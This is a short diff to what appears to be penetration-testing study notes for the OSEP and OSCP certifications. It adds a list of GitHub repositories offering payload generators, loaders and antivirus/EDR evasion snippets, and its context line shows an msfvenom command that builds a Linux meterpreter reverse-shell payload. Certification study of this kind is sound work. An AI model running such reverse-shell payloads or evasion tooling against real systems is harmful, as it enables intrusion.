@@ -391,3 +391,13 @@ sudo msfvenom --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 L
 ```
 
 ---
+
+## References
+
+* [Extravenger/OSEPlayground](https://github.com/Extravenger/OSEPlayground) — Curated OSEP lab snippets: macros/HTA delivery, tunneling, PowerShell loaders, recon helpers.
+* [y4ng0615/osep-automate-payloads](https://github.com/y4ng0615/osep-automate-payloads) — Scripts to automate OSEP‑style payload generation and templates.
+* [deo-gracias/cybersec](https://github.com/deo-gracias/cybersec) — Mixed cybersecurity notes/tools; good companion references (OSCP/OSEP adjacent).
+* [n000b3r/OSCP-Notes](https://github.com/n000b3r/OSCP-Notes) — OSCP notes & command collections; solid foundations for privesc/recon.
+* [chvancooten/OSEP-Code-Snippets](https://github.com/chvancooten/OSEP-Code-Snippets) — Ready‑made code snippets relevant to OSEP (EDR/AV evasion, loaders, etc.).
+
+---
